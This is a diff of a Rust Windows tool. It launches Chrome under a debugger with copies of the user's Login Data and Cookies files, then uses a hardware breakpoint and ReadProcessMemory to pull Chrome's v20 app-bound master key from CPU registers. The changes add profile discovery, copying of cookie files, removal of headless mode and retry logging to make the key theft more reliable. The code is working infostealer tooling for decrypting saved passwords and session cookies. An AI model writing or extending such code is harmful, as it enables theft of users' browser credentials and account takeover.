@@ -282,12 +282,26 @@ fn main() {
         let _ = fs::copy(&local_state, temp_user_dir.join("Local State"));
     }
 
-    // Create a dummy Login Data in the temp Default profile to force key decryption on startup
-    let temp_default = temp_user_dir.join("Default");
-    let _ = fs::create_dir_all(&temp_default);
-    let real_login_data = user_data_dir.join("Default").join("Login Data");
-    if real_login_data.exists() {
-        let _ = fs::copy(&real_login_data, temp_default.join("Login Data"));
+    // Discover profiles and pick the first one to seed the temp directory
+    let profiles = discover_profiles(&user_data_dir);
+    if let Some(profile_name) = profiles.first() {
+        let real_profile = user_data_dir.join(profile_name);
+        let temp_default = temp_user_dir.join("Default");
+        let _ = fs::create_dir_all(&temp_default);
+
+        // Copy essential files to trigger key decryption
+        for file in &["Login Data", "Preferences", "Cookies"] {
+            let src = real_profile.join(file);
+            if src.exists() {
+                let _ = fs::copy(&src, temp_default.join(file));
+            }
+        }
+        // Also Network/Cookies
+        let net_cookies = real_profile.join("Network").join("Cookies");
+        if net_cookies.exists() {
+            let _ = fs::create_dir_all(temp_default.join("Network"));
+            let _ = fs::copy(&net_cookies, temp_default.join("Network").join("Cookies"));
+        }
     }
 
     unsafe {
@@ -298,8 +312,9 @@ fn main() {
 
         let mut pi: PROCESS_INFORMATION = zeroed();
 
+        // Remove --headless as it may bypass the UI thread initialization needed for key decryption
         let cmd_str = format!(
-            "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --user-data-dir=\"{}\" --no-first-run --no-default-browser-check --headless\0",
+            "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --user-data-dir=\"{}\" --no-first-run --no-default-browser-check\0",
             temp_user_dir.to_str().unwrap_or("")
         );
         let mut chrome_cmd: Vec<u16> = cmd_str.encode_utf16().collect();
@@ -337,10 +352,15 @@ unsafe fn debug_loop(h_process: HANDLE) {
     let mut debug_event: DEBUG_EVENT = zeroed();
     let mut chrome_dll_base: *mut std::ffi::c_void = null_mut();
     let mut target_address: usize = 0;
+    let mut loop_count = 0;
 
     loop {
-        if WaitForDebugEvent(&mut debug_event, INFINITE) == 0 {
-            break;
+        if WaitForDebugEvent(&mut debug_event, 5000) == 0 {
+            if target_address != 0 {
+                println!("Waiting for v20 masterkey decryption (heartbeat #{})...", loop_count);
+                loop_count += 1;
+            }
+            continue;
         }
 
         match debug_event.dwDebugEventCode {
@@ -372,11 +392,14 @@ unsafe fn debug_loop(h_process: HANDLE) {
             EXCEPTION_DEBUG_EVENT => {
                 let exception = debug_event.u.Exception;
                 if exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP {
-                    if exception.ExceptionRecord.ExceptionAddress as usize == target_address {
-                        println!("Target breakpoint hit!");
+                    let addr = exception.ExceptionRecord.ExceptionAddress as usize;
+                    if addr == target_address {
+                        println!("Target breakpoint hit at 0x{:X}!", addr);
                         if extract_key(debug_event.dwThreadId, h_process) {
                             clear_hardware_breakpoints(debug_event.dwProcessId);
                             terminate_chrome(h_process);
+                        } else {
+                            println!("Extraction failed at 0x{:X}, waiting for next hit...", addr);
                         }
                     }
                     set_resume_flag(debug_event.dwThreadId);
@@ -795,7 +818,10 @@ unsafe fn extract_key(thread_id: u32, h_process: HANDLE) -> bool {
     if GetThreadContext(h_thread, &mut context) != 0 {
         let key_ptrs = vec![context.R15, context.R14];
         for &ptr in &key_ptrs {
-            if ptr == 0 { continue; }
+            if ptr == 0 {
+                println!("Register was NULL, skipping...");
+                continue;
+            }
             let mut buffer = [0u8; 32];
             let mut bytes_read = 0;
             if ReadProcessMemory(h_process, ptr as *const _, buffer.as_mut_ptr() as *mut _, buffer.len(), &mut bytes_read) != 0 {
